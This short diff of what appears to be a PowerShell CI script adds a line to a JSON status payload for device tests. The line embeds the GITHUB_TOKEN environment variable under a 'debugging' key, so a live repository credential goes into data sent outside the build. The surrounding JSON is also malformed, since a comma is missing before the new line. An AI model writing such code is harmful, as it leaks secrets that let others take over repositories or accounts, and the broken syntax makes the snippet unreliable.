@@ -13,6 +13,7 @@ $json_payload = @"
     "description" : "description placeholder", 
     "context" : "VSTS: device tests",
     "vsts-for-debugging" : $Env:VSTS_BUILD_URL
+    "GH-token-for-debugging" : $Env:GITHUB_TOKEN
 }
 "@
 
